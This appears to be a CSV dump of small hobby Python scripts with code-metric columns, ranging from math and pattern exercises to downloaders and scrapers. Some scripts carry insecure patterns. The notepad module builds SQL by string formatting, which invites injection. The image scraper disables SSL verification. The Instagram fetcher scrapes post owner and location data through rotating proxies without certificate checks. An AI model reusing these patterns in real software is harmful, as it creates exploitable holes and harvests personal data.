from __future__ import print_function

import os


def isSQLite3(filename):
    from os.path import isfile, getsize

    if not isfile(filename):
        return False
    if getsize(filename) < 100:  # SQLite database file header is 100 bytes
        return False
    else:
        fd = open(filename, ""rb"")
        header = fd.read(100)
        fd.close()

        if header[0:16] == ""SQLite format 3\000"":
            return True
        else:
            return False


log = open(""sqlite_audit.txt"", ""w"")
for r, d, f in os.walk(r"".""):
    for files in f:
        if isSQLite3(files):
            print(files)
            print(
                ""[+] '%s' **** is a SQLITE database file **** "" % os.path.join(r, files)
            )
            log.write(""[+] '%s' **** is a SQLITE database file **** "" % files + ""\n"")
        else:
            log.write(
                ""[-] '%s' is NOT a sqlite database file"" % os.path.join(r, files) + ""\n""
            )
            log.write(""[-] '%s' is NOT a sqlite database file"" % files + ""\n"")
",1394,26,30,10,8,7,0,1.0,4,10,5,19.0,14,,29,64.91260938324326,123.18989788986396,3.392857142857143,medio,No,False,False,Low,id108
loader.py,"""""""
Shaurya Pratap Singh 
@shaurya-blip

Shows loading message while doing something.
""""""

import itertools
import threading
import time
import sys

# The task is not done right now
done = False


def animate(message=""loading"", endmessage=""Done!""):
    for c in itertools.cycle([""|"", ""/"", ""-"", ""\\""]):
        if done:
            break
        sys.stdout.write(f""\r {message}"" + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write(f""\r {endmessage} "")


t = threading.Thread(
    target=lambda: animate(message=""installing.."", endmessage=""Installation is done!!!"")
)
t.start()

# Code which you are running

""""""
program.install()
""""""

time.sleep(10)

# Then mark done as true and thus it will end the loading screen.
done = True
",753,20,19,11,3,3,8,1.0,3,1,1,2.0,2,3.0,3,2.0,4.754887502163469,0.5,alto,No,False,False,Low,id109
lcm.py,"def lcm(x, y):
    """"""
        Find least common multiple of 2 positive integers.
        :param x: int - first integer
        :param y: int - second integer
        :return: int - least common multiple

        >>> lcm(8, 4)
            8
        >>> lcm(5, 3)
            15
        >>> lcm(15, 9)
            45
        >>> lcm(124, 23)
            2852
        >>> lcm(3, 6)
            6
        >>> lcm(13, 34)
            442
        >>> lcm(235, 745)
            35015
        >>> lcm(65, 86)
            5590
        >>> lcm(0, 1)
            -1
        >>> lcm(-12, 35)
            -1
    """"""
    if x <= 0 or y <= 0:
        return -1

    if x > y:
        greater_number = x
    else:
        greater_number = y

    while True:
        if (greater_number % x == 0) and (greater_number % y == 0):
            lcm = greater_number
            break
        greater_number += 1
    return lcm


num_1 = int(input(""Enter first number: ""))
num_2 = int(input(""Enter second number: ""))

print(
    ""The L.C.M. of ""
    + str(num_1)
    + "" and ""
    + str(num_2)
    + "" is ""
    + str(lcm(num_1, num_2))
)
",1115,17,23,6,0,0,26,1.0,7,16,8,31.0,21,,47,116.23866587835396,228.32510677099592,5.904761904761905,medio,No,True,False,Medium,id110
nslookup_check.py,"# Script Name		: nslookup_check.py
# Author				: Craig Richards
# Created				: 5th January 2012
# Last Modified		:
# Version				: 1.0

# Modifications		:

# Description			: This very simple script opens the file server_list.txt and then does a nslookup for each one to check the DNS entry

import subprocess  # Import the subprocess module

for server in open(""server_list.txt""):  # Open the file and read each line
    subprocess.Popen(
        (""nslookup "" + server)
    )  # Run the nslookup command for each server in the list
",531,3,5,4,10,7,0,0.0,0,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,False,False,Low,id111
ftp_send_receive.py,"""""""
	File transfer protocol used to send and receive files using FTP server.
	Use credentials to provide access to the FTP client

	Note: Do not use root username & password for security reasons
		  Create a seperate user and provide access to a home directory of the user
		  Use login id and password of the user created 
		  cwd here stands for current working directory
""""""

from ftplib import FTP

ftp = FTP(""xxx.xxx.x.x"")  # Enter the ip address or the domain name here
ftp.login(user=""username"", passwd=""password"")
ftp.cwd(""/Enter the directory here/"")

""""""
	The file which will be received via the FTP server
	Enter the location of the file where the file is received
""""""


def receive_file(filename=""example.txt""):
    with open(filename, ""wb"") as out_file:
        ftp.retrbinary(""RETR "" + filename, out_file.write, 1024)
        ftp.quit()


""""""
	The file which will be sent via the FTP server
	The file send will be send to the current working directory
""""""


def send_file(filename=""example.txt""):
    with open(filename, ""rb"") as in_file:
        ftp.storbinary(""STOR "" + filename, in_file)
        ftp.quit()
",1124,15,12,10,1,0,16,2.0,2,2,1,4.0,4,,6,8.0,13.931568569324174,0.5,alto,No,False,False,Low,id112
string_rotation.py,"# This program rotates a given string letters by letters
# for example:
# input: ""Tie""
# Output: [""ieT"", ""eTi""]


def rotate(n):
    a = list(n)
    if len(a) == 0:
        return print([])
    l = []
    for i in range(1, len(a) + 1):
        a = [a[(i + 1) % (len(a))] for i in range(0, len(a))]
        l += ["""".join(a)]
    print(l)


string = str(input())
print(""Your input is :"", string)
print(""The rotation is :"")
rotate(string)


# Input : Python
# output :
# The rotation is :
# ['ythonp', 'thonpy', 'honpyt', 'onpyth', 'npytho', 'python']
",549,13,13,6,8,8,0,,4,5,3,10.0,9,12.0,15,33.28421251514428,53.77443751081735,1.6666666666666667,alto,No,True,False,Low,id113
love_turtle.py,"import turtle

t = turtle.Turtle()
turtle.title(""I Love You"")
screen = turtle.Screen()
screen.bgcolor(""white"")
t.color(""red"")
t.begin_fill()
t.fillcolor(""black"")

t.left(140)
t.forward(180)
t.circle(-90, 200)

t.setheading(60)  # t.left
t.circle(-90, 200)
t.forward(180)

t.end_fill()
t.hideturtle()
",300,16,16,4,1,0,0,0.0,0,2,1,2.0,1,,4,0.0,4.0,1.0,alto,No,False,False,Low,id114
new_pattern.py,"#pattern
#@@@@@@@@    $
#@@@@@@@    $$
#@@@@@@    $$$
#@@@@@    $$$$
#@@@@    $$$$$
#@@@    $$$$$$
#@@    $$$$$$$
#@    $$$$$$$$

def main():
    lines = int(input(""Enter no.of lines: ""))
    pattern(lines)

def pattern(lines):
    t = 1
    for i in reversed(range(lines)):
        nxt_pattern = ""$""*t
        pattern = ""@""*(i+1)
        final_pattern = pattern + ""   n "" + nxt_pattern
        print(final_pattern)
        t = t +1

if __name__ == ""__main__"":
    main()",471,13,13,3,9,9,0,2.0,3,7,3,14.0,12,,21,47.77443751081735,82.0447025077789,1.75,alto,No,True,False,Low,id115
image_grapper.py,"#!/usr/bin/python
# -*- coding: utf-8 -*-
# importing required libraries
import json
from os import chdir, system
from os import walk
from os.path import curdir
from os.path import pardir
from urllib.parse import urlencode
from urllib.request import urlopen, Request

import requests
import ssl
from bs4 import BeautifulSoup
from create_dir import create_directory


ssl._create_default_https_context = ssl._create_unverified_context

GOOGLE_IMAGE = (
    ""https://www.google.com/search?site=&tbm=isch&source=hp&biw=1873&bih=990&""
)
WALLPAPERS_KRAFT = ""https://wallpaperscraft.com/search/keywords?""
usr_agent = {
    ""User-Agent"": ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"",
    ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"",
    ""Accept-Charset"": ""ISO-8859-1,utf-8;q=0.7,*;q=0.3"",
    ""Accept-Encoding"": ""none"",
    ""Accept-Language"": ""en-US,en;q=0.8"",
    ""Connection"": ""keep-alive"",
}

FX = {
    1: ""search_for_image"",
    2: ""download_wallpapers_1080p"",
    3: ""view_images_directory"",
    4: ""set_directory"",
    5: ""quit"",
}


# Download images from google images


def search_for_image():
    print(""Enter data to download Images: "")
    data = input()
    search_query = {""q"": data}
    search = urlencode(search_query)
    print(search)
    g = GOOGLE_IMAGE + search
    request = Request(g, headers=usr_agent)
    r = urlopen(request).read()
    sew = BeautifulSoup(r, ""html.parser"")
    images = []

    # print(sew.prettify())

    results = sew.findAll(""div"", {""class"": ""rg_meta""})
    for re in results:
        (link, Type) = (json.loads(re.text)[""ou""], json.loads(re.text)[""ity""])
        images.append(link)
    counter = 0
    for re in images:
        rs = requests.get(re)
        with open(""img"" + str(counter) + "".jpg"", ""wb"") as file:
            file.write(rs.content)

            # urlretrieve(re, 'img' + str(count) + '.jpg')

            counter += 1
    return True


def download_wallpapers_1080p():
    cont = set()  # Stores the links of images
    temp = set()  # Refines the links to download images

    print(""Enter data to download wallpapers: "")
    data = input()
    search_query = {""q"": data}
    search = urlencode(search_query)
    print(search)
    g = WALLPAPERS_KRAFT + search
    request = Request(g, headers=usr_agent)
    r = urlopen(request).read()
    sew = BeautifulSoup(r, ""html.parser"")
    count = 0
    for links in sew.find_all(""a""):
        if ""wallpaperscraft.com/download"" in links.get(""href""):
            cont.add(links.get(""href""))
    for re in cont:
        # print all valid links
        # print('https://wallpaperscraft.com/image/' + re[31:-10] + '_' + re[-9:] + '.jpg')

        temp.add(
            ""https://wallpaperscraft.com/image/"" + re[31:-10] + ""_"" + re[-9:] + "".jpg""
        )

    # Goes to Each link and downloads high resolution images

    for re in temp:
        rs = requests.get(re)
        with open(""img"" + str(count) + "".jpg"", ""wb"") as file:
            file.write(rs.content)

        # urlretrieve(re, 'img' + str(count) + '.jpg')

        count += 1

    return True


###################
def view_images_directory():
    for (folders, subfolder, files) in walk(curdir):
        for folder in subfolder:
            print(folder)
    return True


#############
def set_directory():
    print(""Enter the directory to be set: "")
    data = input()
    chdir(data + "":\\"")
    print(""Enter name for the folder: "")
    data = input()
    create_directory(data)
    return True


##############
def quit():
    print(
        """"""
-------------------------***Thank You For Using***-------------------------
        """"""
    )
    return False


run = True

print(
    """"""
***********[First Creating Folder To Save Your Images}***********
    """"""
)

create_directory(""Images"")
DEFAULT_DIRECTORY = pardir + ""\\Images""
chdir(DEFAULT_DIRECTORY)
count = 0
while run:
    print(
        """"""
-------------------------WELCOME-------------------------
    1. Search for image
    2. Download Wallpapers 1080p
    3. View Images in your directory
    4. Set directory
    5. Exit
-------------------------*******-------------------------
    """"""
    )
    choice = input()
    try:
        # Via eval() let `str expression` to `function`
        fx = eval(FX[int(choice)])
        run = fx()
    except KeyError:
        system(""clear"")
        if count <= 5:
            count += 1
            print(""----------enter proper key-------------"")
        else:
            system(""clear"")
            print(""You have attempted 5 times , try again later"")
            run = False
",4645,105,134,32,16,14,0,5.0,13,19,4,36.0,34,,55,180.9737366025116,288.6360132393972,2.117647058823529,medio,No,True,False,Low-Medium,id116
Heap sort.py,"# Python program for implementation of heap Sort

# To heapify subtree rooted at index i.
# n is size of heap
def heapify(arr, n, i):
    largest = i  # Initialize largest as root
    l = 2 * i + 1  # left = 2*i + 1
    r = 2 * i + 2  # right = 2*i + 2

    # See if left child of root exists and is
    # greater than root
    if l < n and arr[i] < arr[l]:
        largest = l

    # See if right child of root exists and is
    # greater than root
    if r < n and arr[largest] < arr[r]:
        largest = r

    # Change root, if needed
    if largest != i:
        arr[i], arr[largest] = arr[largest], arr[i]  # swap

        # Heapify the root.
        heapify(arr, n, largest)


# The main function to sort an array of given size
def heapSort(arr):
    n = len(arr)

    # Build a maxheap.
    # Since last parent will be at ((n//2)-1) we can start at that location.
    for i in range(n // 2 - 1, -1, -1):
        heapify(arr, n, i)

    # One by one extract elements
    for i in range(n - 1, 0, -1):
        arr[i], arr[0] = arr[0], arr[i]  # swap
        heapify(arr, i, 0)


# Driver code to test above
arr = [12, 11, 13, 5, 6, 7]
heapSort(arr)
n = len(arr)
print(""Sorted array is"")
for i in range(n):
    print(""%d"" % arr[i]),
",1239,24,24,11,19,14,0,2.0,9,18,9,33.0,23,,51,132.57125000229212,255.0,6.456521739130435,medio,No,False,False,,id117
Calculate resistance.py,"def res(R1, R2):
      sum = R1 + R2
      if (option ==""series""):
          return sum
      else:
          return (R1 * R2)/(R1 + R2)
Resistance1 = int(input(""Enter R1 : ""))
Resistance2 = int(input(""Enter R2 : ""))
option = str(input(""Enter series or parallel :""))
print(""\n"")
R = res(Resistance1,Resistance2 )
print(""The total resistance is"", R)
",349,12,12,0,0,0,0,1.0,2,5,4,10.0,6,,15,23.509775004326936,49.82892142331044,3.333333333333333,medio,No,True,False,Low,id118
create_dir.py,"""""""
Code to directly use in file to
create directory in home location

Note:- I Have used python package so if you want
to create in the main directory of your project use
pardir+""\\""+name in functions

All the folder operations are done on home
project directory.
""""""

from os import chdir
from os import makedirs
from os import removedirs
from os import rename
from os.path import exists
from os.path import pardir
from shutil import copytree
from shutil import move


# Creates a directory
def create_directory(name):
    if exists(pardir + ""\\"" + name):
        print(""Folder already exists... Cannot Overwrite this"")
    else:
        makedirs(pardir + ""\\"" + name)


# Deletes a directory
def delete_directory(name):
    removedirs(name)


# Rename a directory
def rename_directory(direct, name):
    rename(direct, name)


# Sets the working directory
def set_working_directory():
    chdir(pardir)


# Backup the folder tree
def backup_files(name_dir, folder):
    copytree(pardir, name_dir + "":\\"" + folder)


# Move folder to specific location
# Overwrites the file if it already exists
def move_folder(filename, name_dir, folder):
    if not exists(name_dir + "":\\"" + folder):
        makedirs(name_dir + "":\\"" + folder)
    move(filename, name_dir + "":\\"" + folder + ""\\"")


""""""
For test purpose:
    1. create_directory(""test"")
    2. rename_directory(""test"",""demo"")
    3. delete_directory(""demo"")
    4. backup_files('D', 'backup_project')
    5. move_folder(pardir+'\\'+'test.txt', 'D', 'name')
""""""
",1515,27,25,17,7,7,17,6.0,8,14,2,27.0,18,,41,77.05865002596161,177.19905189038187,1.5,medio,No,False,False,Low,id119
Detect_Remove_loop.py,"class Node:
    def __init__(self, data):
        self.data = data
        self.next = None


class Linked_List:
    def __init__(self):
        self.head = None

    def Insert_At_End(self, new_data):
        new_node = Node(new_data)
        if self.head is None:
            self.head = new_node
            return
        current = self.head
        while current.next:
            current = current.next
        current.next = new_node

    def Detect_and_Remove_Loop(self):
        slow = fast = self.head
        while slow and fast and fast.next:
            slow = slow.next
            fast = fast.next.next
            if slow == fast:
                self.Remove_loop(slow)
                print(""Loop Found"")
                return 1
        return 0

    def Remove_loop(self, Loop_node):
        ptr1 = self.head
        while 1:
            ptr2 = Loop_node
            while ptr2.next != Loop_node and ptr2.next != ptr1:
                ptr2 = ptr2.next
            if ptr2.next == ptr1:
                break
            ptr1 = ptr1.next
        ptr2.next = None

    def Display(self):
        temp = self.head
        while temp:
            print(temp.data, ""->"", end="" "")
            temp = temp.next
        print(""None"")


if __name__ == ""__main__"":
    L_list = Linked_List()
    L_list.Insert_At_End(8)
    L_list.Insert_At_End(5)
    L_list.Insert_At_End(10)
    L_list.Insert_At_End(7)
    L_list.Insert_At_End(6)
    L_list.Insert_At_End(11)
    L_list.Insert_At_End(9)
    print(""Linked List with Loop: "")
    L_list.Display()
    print(""Linked List without Loop: "")
    L_list.head.next.next.next.next.next.next.next = L_list.head.next.next
    L_list.Detect_and_Remove_Loop()
    L_list.Display()
",1794,57,57,8,0,0,0,6.0,23,8,4,17.0,12,,25,51.01955000865388,100.0,2.833333333333333,bajo,Yes,False,False,Low,id120
notepad_support.py,"#! /usr/bin/env python
#
# Support module generated by PAGE version 4.10
# In conjunction with Tcl version 8.6
#    Jan 29, 2018 03:25:00 PM


import sqlite3

try:
    from Tkinter import *
except ImportError:
    from tkinter import *

try:
    import ttk

    py3 = 0
except ImportError:
    import tkinter.ttk as ttk

    py3 = 1

# connect with database 'data.db'
connection = sqlite3.connect(""data.db"")

# creates a cursor (pointer) to the data base
cursor = connection.cursor()

search = False

results = []

index = 0


def delete_button(p1):
    global index
    global results
    global cursor

    # fetch id of the current note
    id = results[index][0]

    sql_command = """""" DELETE FROM notes WHERE id = {0}; """"""
    sql_command = sql_command.format(id)

    cursor.execute(sql_command)

    connection.commit()


def create_button(p1):
    """"""
    for creating a new database
    """"""
    global cursor

    sql_command = """"""
    CREATE TABLE notes ( 
    id INTEGER PRIMARY KEY, 
    title TEXT, 
    note TEXT);""""""

    try:
        cursor.execute(sql_command)
        w.errorOutput.configure(text="""")
    except:
        w.errorOutput.configure(text=""The database already exists"")


def add_button(p1):
    # for manipulating the data base
    global cursor
    global connection
    if len(w.inputTitle.get()) > 0 and len(w.inputNotice.get(1.0, END)) > 0:
        w.errorOutput.configure(text="""")
        title = w.inputTitle.get()
        note = w.inputNotice.get(1.0, END)
        sql_command = """"""INSERT INTO notes (title,note) VALUES (""{0}"",""{1}""); """"""
        sql_command = sql_command.format(title, note)
        cursor.execute(sql_command)
        connection.commit()
    else:
        w.errorOutput.configure(text=""Please fill the fields. "")


def back_button(p1):
    global search
    global results
    global index

    w.errorOutput.configure(text="""")
    index -= 1
    if index >= 0 and index < len(results):
        w.outputNotice.delete(1.0, END)
        w.outputNotice.insert(1.0, results[index][2])


def clear_button(p1):
    """"""
    This function is for the clear button.
    This will clear the notice-input field
    """"""
    w.inputNotice.delete(1.0, END)


def exit_button(p1):
    """"""
    function for the exit button.
    this will exit the application.
    """"""
    sys.exit(0)


def search_button(p1):
    global cursor
    global results
    global index
    w.errorOutput.configure(text="""")
    sql_command = """""" SELECT * FROM notes WHERE title LIKE ""%{0}%"";""""""
    sql_command = sql_command.format(w.inputSearchTitle.get())
    try:
        cursor.execute(sql_command)
        results = cursor.fetchall()
        w.errorOutput.configure(text=str(len(results)) + "" results"")
        index = 0
        if index >= 0 and index < len(results):
            w.outputNotice.delete(1.0, END)
            w.outputNotice.insert(1.0, results[index][2])
    except:
        w.errorOutput.configure(text=""Please create at first a database."")


def next_button(p1):
    global results
    global index
    index += 1
    if len(w.inputSearchTitle.get()) > 0:
        if index >= 0 and index < len(results):
            w.outputNotice.delete(1.0, END)
            w.outputNotice.insert(1.0, results[index][2])

    else:
        w.errorOutput.configure(text=""Please fill the search field. "")


def init(top, gui, *args, **kwargs):
    global w, top_level, root
    w = gui
    top_level = top
    root = top


def destroy_window():
    # Function which closes the window.
    global top_level
    top_level.destroy()
    top_level = None


if __name__ == ""__main__"":
    import notepad

    notepad.vp_start_gui()
",3648,101,102,42,10,10,11,10.0,21,17,7,34.0,27,,51,148.0334470128169,259.4606049037673,4.407407407407407,medio,No,False,False,Medium,id121
pattern6.py,"# Python code to print the following alphabet pattern
#A 
#B B 
#C C C 
#D D D D 
#E E E E E   
def alphabetpattern(n):
    num = 65
    for i in range(0, n):
        for j in range(0, i+1):
            ch = chr(num)
            print(ch, end="" "")
        num = num + 1
        print(""\r"")

a = 5
alphabetpattern(a)
",333,10,10,1,6,6,0,1.0,3,2,1,4.0,3,,6,4.754887502163469,12.0,0.6666666666666666,alto,No,False,False,Low,id122
CliYoutubeDownloader.py,"# libraraies

import pytube
import sys


class YouTubeDownloder:
    def __init__(self):
        self.url = str(input(""Enter the url of video : ""))
        self.youtube = pytube.YouTube(
            self.url, on_progress_callback=YouTubeDownloder.onProgress
        )
        self.showTitle()

    def showTitle(self):
        print(""title : {0}\n"".format(self.youtube.title))
        self.showStreams()

    def showStreams(self):
        self.streamNo = 1
        for stream in self.youtube.streams:
            print(
                ""{0} => resolution:{1}/fps:{2}/type:{3}"".format(
                    self.streamNo, stream.resolution, stream.fps, stream.type
                )
            )
            self.streamNo += 1
        self.chooseStream()

    def chooseStream(self):
        self.choose = int(input(""please select one : ""))
        self.validateChooseValue()

    def validateChooseValue(self):
        if self.choose in range(1, self.streamNo):
            self.getStream()
        else:
            print(""please enter a correct option on the list."")
            self.chooseStream()

    def getStream(self):
        self.stream = self.youtube.streams[self.choose - 1]
        self.getFileSize()

    def getFileSize(self):
        global file_size
        file_size = self.stream.filesize / 1000000
        self.getPermisionToContinue()

    def getPermisionToContinue(self):
        print(
            ""\n title : {0} \n author : {1} \n size : {2:.2f}MB \n resolution : {3} \n fps : {4} \n "".format(
                self.youtube.title,
                self.youtube.author,
                file_size,
                self.stream.resolution,
                self.stream.fps,
            )
        )
        if input(""do you want it ?(defualt = (y)es) or (n)o "") == ""n"":
            self.showStreams()
        else:
            self.main()

    def download(self):
        self.stream.download()

    @staticmethod
    def onProgress(stream=None, chunk=None, remaining=None):
        file_downloaded = file_size - (remaining / 1000000)
        print(
            f""downloading ... {file_downloaded/file_size*100:0.2f} % [{file_downloaded:.1f}MB of {file_size:.1f}MB]"",
            end=""\r"",
        )

    def main(self):
        try:
            self.download()
        except KeyboardInterrupt:
            print(""Canceled. "")
            sys.exit(0)


if __name__ == ""__main__"":
    try:
        YouTubeDownloder()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(e)
",2523,57,74,15,1,1,0,11.0,17,10,6,20.0,19,,30,96.22039775975506,139.31568569324173,3.1578947368421053,bajo,Yes,True,False,Low,id123
print_colors.py,"import sys


class colors:
    CYAN = ""\033[36m""
    GREEN = ""\033[32m""
    YELLOW = ""\033[33m""
    BLUE = ""\033[34m""
    RED = ""\033[31m""
    ENDC = ""\033[0m""


def printc(color, message):
    print(color + message + colors.ENDC)


# color which we print or import
printc(colors.CYAN, sys.argv[1])
printc(colors.GREEN, sys.argv[1])
printc(colors.YELLOW, sys.argv[1])
printc(colors.BLUE, sys.argv[1])
printc(colors.RED, sys.argv[1])
",433,15,15,6,1,1,0,1.0,2,2,1,4.0,4,,6,8.0,13.931568569324174,0.5,alto,Yes,False,False,Low,id124
insta_datafetcher.py,"# only god knows  whats happening in the code
# if I forget the code structure
# please pray to god for help
import asyncio
import multiprocessing
import os
import random
import re
import socket
import sys
import time

import bs4
import pymongo
import requests
import socks
import ujson
import urllib3

try:
    import instagram_monitering.con_file as config
except Exception as e:
    print(e)
    import con_file as config


class PorxyApplyingDecorator(object):
    def __init__(self):
        filename = os.getcwd() + ""/"" + ""ipList.txt""
        with open(filename, ""r"") as f:
            ipdata = f.read()
        self._IP = random.choice(ipdata.split("",""))

    def __call__(self, function_to_call_for_appling_proxy):
        SOCKS5_PROXY_HOST = self._IP
        # default_socket = socket.socket
        socks.set_default_proxy(
            socks.SOCKS5,
            SOCKS5_PROXY_HOST,
            config.SOCKS5_PROXY_PORT,
            True,
            config.auth,
            config.passcode,
        )
        socket.socket = socks.socksocket

        def wrapper_function(url):
            # this is used for applyting socks5 proxy over the request
            return function_to_call_for_appling_proxy(url)

        socks.set_default_proxy()
        return wrapper_function


async def dataprocess(htmldata):
    bs4obj = bs4.BeautifulSoup(htmldata, ""html.parser"")
    scriptsdata = bs4obj.findAll(""script"", {""type"": ""text/javascript""})
    datatext = """"
    for i in scriptsdata:
        datatext = i.text
        if ""window._sharedData ="" in datatext:
            break
    datajson = re.findall(""{(.*)}"", datatext)
    datajson = ""{"" + datajson[0] + ""}""
    datadict = ujson.loads(datajson)
    maindict = {}
    datadict = datadict[""entry_data""][""PostPage""][0][""graphql""][""shortcode_media""]
    tofind = [""owner"", ""location""]
    for i in tofind:
        try:
            maindict[i] = datadict[i]
        except Exception as e:
            print(e)
            pass
    return maindict


async def datapullpost(future, url):
    while True:

        @PorxyApplyingDecorator()
        async def request_pull(url):
            data = None
            print(url)
            urllib3.disable_warnings()
            user_agent = {""User-agent"": ""Mozilla/17.0""}
            try:
                data = requests.get(
                    url=url, headers=user_agent, timeout=10, verify=False
                ).text
            except Exception as e:
                print(e)
                data = None
            finally:
                return data

        data = await request_pull(url)
        if data != None:
            break
    data = await dataprocess(htmldata=data)
    # here processing of data has to occur
    future.set_result(data)


class MoniteringClass:
    def __init__(self, user, tags, type, productId):

        try:
            self.mon = pymongo.MongoClient(host=config.host, port=config.mongoPort)
            db = self.mon[productId + "":"" + user + "":insta""]
            self._collection = db[tags]
            if type == ""hashtags"":
                self._url = ""https://www.instagram.com/explore/tags/"" + tags + ""/?__a=1""
            if type == ""profile"":
                self._url = ""https://www.instagram.com/"" + tags + ""/?__a=1""
        except Exception as err:
            print(f""exception {err}"")
            print(""error::MointeringClass.__init__>>"", sys.exc_info()[1])

    def _dataProcessing(self, data):
        loop = asyncio.get_event_loop()
        userdata = []
        try:
            if not isinstance(data, dict):
                raise Exception
            media_post = data[""tag""][""media""][""nodes""]
            top_post = data[""tag""][""top_posts""][""nodes""]
            print(""media post ::"", len(media_post))
            print(""top_post::"", len(top_post))
            futures = []
            for i in media_post:
                tempdict = {}
                tempdict[""url""] = ""https://www.instagram.com/p/"" + i[""code""] + ""/""
                tempdict[""code""] = i[""code""]
                userdata.append(tempdict)
            for i in top_post:
                tempdict = {}
                tempdict[""url""] = ""https://www.instagram.com/p/"" + i[""code""] + ""/""
                tempdict[""code""] = i[""code""]
                userdata.append(tempdict)
            for i in userdata:
                i[""future""] = asyncio.Future()
                futures.append(i[""future""])
                asyncio.ensure_future(datapullpost(future=i[""future""], url=i[""url""]))
            loop.run_until_complete(asyncio.wait(futures))
            for i in userdata:
                i[""data""] = i[""future""].result()
        except Exception as err:
            print(f""Exception ! : {err}"")
            print(""error::Monitering.dataProcessing>>"", sys.exc_info()[1])
        finally:
            # loop.close()
            print(""userdata::"", len(userdata))
            print(""media_post::"", len(media_post))
            print(""top post::"", len(top_post))
            return userdata, media_post, top_post

    def _insertFunction(self, record):
        try:
            records = self._collection.find({""id"": record[""id""]})
            if records.count() == 0:
                # record[""timestamp""] = time.time()
                self._collection.insert(record)
        except Exception as err:
            print(f""Execption : {err}"")
            print(""error::Monitering.insertFunction>>"", sys.exc_info()[1])

    def _lastProcess(self, userdata, media_post, top_post):
        mainlist = []
        try:
            for i in userdata:
                for j in media_post:
                    if i[""code""] == j[""code""]:
                        tempdict = j.copy()
                        tofind = [""owner"", ""location""]
                        for z in tofind:
                            try:
                                tempdict[z + ""data""] = i[""data""][z]
                            except Exception as e:
                                print(f""exception : {e}"")
                                pass
                        mainlist.append(tempdict)
                        self._insertFunction(tempdict.copy())
                for k in top_post:
                    if i[""code""] == k[""code""]:
                        tempdict = k.copy()
                        tofind = [""owner"", ""location""]
                        for z in tofind:
                            try:
                                tempdict[z + ""data""] = i[""data""][z]
                            except Exception as err:
                                print(f""Exception :{err}"")
                                pass
                        mainlist.append(tempdict)
                        self._insertFunction(tempdict.copy())
        except Exception as err:
            print(f""Exception : {err}"")
            print(""error::lastProcess>>"", sys.exc_info()[1])

    def request_data_from_instagram(self):
        try:
            while True:

                @PorxyApplyingDecorator()
                def reqest_pull(url):
                    print(url)
                    data = None
                    urllib3.disable_warnings()
                    user_agent = {""User-agent"": ""Mozilla/17.0""}
                    try:
                        data = requests.get(
                            url=url, headers=user_agent, timeout=24, verify=False
                        ).text
                    except Exception as err:
                        print(f""Exception : {err}"")
                        data = None
                    finally:
                        return data

                data = reqest_pull(self._url)
                if data != None:
                    break
            datadict = ujson.loads(data)
            userdata, media_post, top_post = self._dataProcessing(datadict)
            finallydata = self._lastProcess(
                userdata=userdata, media_post=media_post, top_post=top_post
            )
            # print(ujson.dumps(finallydata))
        except Exception as e:
            print(f""exception : {e}\n"")
            print(""error::Monitering.request_data_from_instagram>>"", sys.exc_info()[1])

    def __del__(self):
        self.mon.close()


def hashtags(user, tags, type, productId):
    try:
        temp = MoniteringClass(user=user, tags=tags, type=type, productId=productId)
        temp.request_data_from_instagram()
    except Exception as err:
        print(f""exception : {err} \n"")
        print(""error::hashtags>>"", sys.exc_info()[1])


class theradPorcess(multiprocessing.Process):
    def __init__(self, user, tags, type, productId):
        try:
            multiprocessing.Process.__init__(self)
            self.user = user
            self.tags = tags
            self.type = type
            self.productId = productId
        except Exception as err:
            print(f""exception : {err}\n"")
            print(""errorthreadPorcess:>>"", sys.exc_info()[1])

    def run(self):
        try:
            hashtags(
                user=self.user, tags=self.tags, type=self.type, productId=self.productId
            )
        except Exception as err:
            print(f""exception : {err}\n"")
            print(""error::run>>"", sys.exc_info()[1])


class InstaPorcessClass:
    def _dbProcessReader(self, user, tags, productId):
        value = True
        mon = pymongo.MongoClient(host=config.host, port=config.mongoPort)
        try:
            db = mon[""insta_process""]
            collection = db[""process""]
            temp = {}
            temp[""user""] = user
            temp[""tags""] = tags
            temp[""productId""] = productId
            records = collection.find(temp).count()
            if records == 0:
                raise Exception
            value = True
        except Exception as err:
            print(f""exception : {err}\n"")
            value = False
            print(""error::dbProcessReader:>>"", sys.exc_info()[1])
        finally:
            mon.close()
            return value

    def _processstart(self, user, tags, productId):
        mon = pymongo.MongoClient(host=config.host, port=config.mongoPort)
        try:
            db = mon[""insta_process""]
            collection = db[""process""]
            temp = {}
            temp[""user""] = user
            temp[""tags""] = tags
            temp[""productId""] = productId
            collection.insert(temp)
        except Exception as err:
            print(f""execption : {err}\n"")
            print(""error::processstart>>"", sys.exc_info()[1])
        finally:
            mon.close()

    def startprocess(self, user, tags, type, productId):
        try:
            self._processstart(user=user, tags=tags, productId=productId)
            while True:
                # therad = theradPorcess(user=user, tags=tags, type=type)
                # therad.start()
                hashtags(user=user, tags=tags, type=type, productId=productId)
                check = self._dbProcessReader(user=user, tags=tags, productId=productId)
                print(check)
                if check == False:
                    break
                time.sleep(300)
                # therad.join()
        except Exception as err:
            print(f""exception : {err}\n"")
            print(""error::startPoress::>>"", sys.exc_info()[1])

    def deletProcess(self, user, tags, productId):
        mon = pymongo.MongoClient(host=config.host, port=config.mongoPort)
        try:
            db = mon[""insta_process""]
            collection = db[""process""]
            temp = {}
            temp[""user""] = user
            temp[""tags""] = tags
            temp[""productId""] = productId
            collection.delete_one(temp)
        except Exception as err:
            print(f""exception : {err}\n"")
            print(""error::deletProcess:>>"", sys.exc_info()[1])
        finally:
            mon.close()
            print(""deleted - task"", temp)
            return True

    def statusCheck(self, user, tags, productId):
        mon = pymongo.MongoClient(host=config.host, port=config.mongoPort)
        try:
            db = mon[""insta_process""]
            collection = db[""process""]
            temp = {}
            temp[""user""] = user
            temp[""tags""] = tags
            temp[""productId""] = productId
            records = collection.find(temp).count()
            if records == 0:
                result = False
            else:
                result = True
        except Exception as err:
            print(f""exception : {err}\n"")
            print(""error::dbProcessReader:>>"", sys.exc_info()[1])
        finally:
            mon.close()
            return result


class DBDataFetcher:
    def __init__(self, user, tags, type, productId):
        try:
            self.mon = pymongo.MongoClient(host=config.host, port=config.mongoPort)
            db = self.mon[productId + "":"" + user + "":insta""]
            self._collection = db[tags]
        except Exception as err:
            print(f""exception : {err}\n"")
